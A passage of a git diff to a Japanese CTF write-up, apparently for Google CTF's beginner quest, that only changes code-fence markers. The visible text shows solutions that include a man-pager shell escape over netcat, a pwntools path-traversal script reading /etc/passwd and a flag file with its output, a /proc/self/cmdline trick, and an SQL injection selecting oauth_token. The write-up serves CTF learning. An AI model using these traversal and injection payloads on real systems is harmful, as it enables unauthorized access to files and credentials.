@@ -579,10 +579,10 @@ choosing songs from random artist: yotti' UNION SELECT ( SELECT oauth_token FROM
 ここからはrevの問題の解説をしていきます。<br>
 まずファイルを解凍するとchallenge.ext4というファイルが出てきます
 
-'''
+```
 net40-dhcp107:gctf yotti$ file challenge.ext4 
 challenge.ext4: Linux rev 1.0 ext4 filesystem data (extents) (64bit) (large files) (huge files)
-'''
+```
 
 これはlinuxのファイルシステムなので、普通にマウントしてあげればokです。<br>
 あとはファイルシステムの中を見ると'.mediapc_backdoor_password.gz' と言うファイルがあるので解凍してあげるとフラッグが出てきます。
@@ -594,10 +594,10 @@ ctf='CTF{I_kn0W_tH15_Fs}'
 ファイルを解凍すると、gatekeeperと言うファイルが出てきます。<br>
 まず権限がないので,権限の付与をしてあげ,実行してみます。<br>
 
-'''
+```
 net40-dhcp107:gctf yotti$ file gatekeeper
 gatekeeper: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, not stripped
-'''
+```
 
 とうやらelfファイルのようです。
 
@@ -612,7 +612,7 @@ PWNの問題に入っていきます<br>
 '$nc moar.ctfcompetition.com 1337'<br>
 に接続してみます。<br>
 
-'''
+```
 net40-dhcp107:gctf yotti$ nc moar.ctfcompetition.com 1337
 socat(1)                                                              socat(1)
 
@@ -638,12 +638,12 @@ DESCRIPTION
        descriptors  to  stdout.  It  has been written for debugging socat, but
        might be useful for other purposes too. Use the -h option to find  more
 
-'''
+```
 
 どうやらmanコマンドでsocketと言うファイルの説明をしているようです<br>
 あとはmanコマンドから抜けるために!コマンドを使えばokです。<br>
 
-'''
+```
 DESCRIPTION
        Socat  is  a  command  line based utility that establishes two bidirec-
        tional byte streams  and  transfers  data  between  them.  Because  the
@@ -687,7 +687,7 @@ total 4
 echo 'Disabling DMZ using password CTF{SOmething-CATastr0phic}'
 echo CTF{SOmething-CATastr0phic} > /dev/dmz
 !done  (press RETURN)n
-'''
+```
 
 はい、フラッグ入手です<br>
 flag: 'CTF{SOmething-CATastr0phic} '
@@ -697,7 +697,7 @@ flag: 'CTF{SOmething-CATastr0phic} '
 'nc mngmnt-iface.ctfcompetition.com 1337' <br>
 サーバーへ接続してみます
 
-'''
+```
 net40-dhcp107:gctf yotti$ nc mngmnt-iface.ctfcompetition.com 1337
 === Management Interface ===
  1) Service access
@@ -732,14 +732,14 @@ Version0.3
  2) Read EULA/patch notes
  3) Quit
 
-'''
+```
 
 試しに接続して色々やってみると、どうやら2でflagの場所を入力するみたいです<br>
 毎回接続するのはめんどくさいのでpythonでプログラムを作って実行します。<br>
 
 何回か接続を試しながら作ったものです.
 
-'''
+```
 #! /usr/bin/env python2                                                                                 
 
 from pwn import *
@@ -757,12 +757,12 @@ s.sendline("../../../../../etc/passwd")
 print s.recv()
 print s.recv()
 s.close()
+```
 
-'''
 
 実行すると<br>
 
-'''
+```
 net40-dhcp107:script yotti$ ./admin1.py
 [+] Opening connection to mngmnt-iface.ctfcompetition.com on port 1337: Done
 root:x:0:0:root:/root:/bin/bash
@@ -796,13 +796,13 @@ user:x:1337:1337::/home/user:
  3) Quit
 
 [*] Closed connection to mngmnt-iface.ctfcompetition.com port 1337
-'''
+```
 
 のようになります<br>
 user:x:1337:1337::/home/user:<br>
 なのでプログラムの部分を/home/user/flagに書き直したらflagがでてきました。<br>
 
-'''
+```
 net40-dhcp107:script yotti$ ./admin1.py
 [+] Opening connection to mngmnt-iface.ctfcompetition.com on port 1337: Done
 CTF{I_luv_buggy_sOFtware}
@@ -812,7 +812,7 @@ CTF{I_luv_buggy_sOFtware}
  3) Quit
 
 [*] Closed connection to mngmnt-iface.ctfcompetition.com port 1337
-'''
+```
 
 flag:'CTF{I_luv_buggy_sOFtware}'
 
@@ -820,9 +820,9 @@ flag:'CTF{I_luv_buggy_sOFtware}'
 
 先ほどと同じサーバでの問題です<br>
 
-'''
+```
 That first flag was a dud, but I think using a similar trick to get the full binary file might be needed here. There is a least one password in there somewhere. Maybe reversing this will give you access to the authenticated area, then you can turn up the heat… literally.
-'''
+```
 
 まず実行可能ファイルを取得します。<br>
 '../../../../../../proc/self/cmdline'と入力すると'../main'とでてくるのでここにダンプされた実行ファイルを取得します<br>
